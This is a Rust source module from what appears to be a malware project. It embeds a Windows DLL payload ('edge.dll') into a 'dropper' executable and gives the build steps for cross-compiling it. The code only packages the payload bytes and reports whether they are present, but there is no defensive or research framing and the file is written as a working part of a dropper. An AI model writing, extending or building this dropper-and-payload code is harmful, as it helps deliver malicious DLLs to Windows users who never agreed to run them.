//! # Embedded Payload Module
//!
//! Provides embedded edge.dll bytes for the dropper.
//! Build process: 
//! 1. cargo build -p edge --release --target x86_64-pc-windows-gnu (builds DLL first)
//! 2. Copy DLL to src/assets/payload.dll
//! 3. cargo build -p edge --release --target x86_64-pc-windows-gnu (builds EXE with embedded DLL)
//!
//! NOTE: payload.dll is only embedded in the EXE binary, not the DLL lib.
//! The DLL IS the payload, so it shouldn't embed itself.

/// Embedded edge.dll payload bytes - ONLY for EXE (dropper)
/// When building the DLL lib, this returns empty
#[cfg(target_os = "windows")]
pub static PAYLOAD_DLL: &[u8] = include_bytes!("payload.dll");

/// Fallback for non-Windows builds  
#[cfg(not(target_os = "windows"))]
pub static PAYLOAD_DLL: &[u8] = &[];

/// Check if payload is available (not empty/dummy)
/// Returns false when running as DLL (self is payload)
pub fn is_payload_available() -> bool {
    // If running in DLL context (no exe name), payload not needed
    if std::env::current_exe()
        .map(|p| p.extension().map(|e| e == "dll").unwrap_or(false))
        .unwrap_or(false) 
    {
        return false;
    }
    PAYLOAD_DLL.len() > 1024 // Real DLL is > 1KB
}

/// Get payload bytes
pub fn get_payload() -> &'static [u8] {
    PAYLOAD_DLL
}

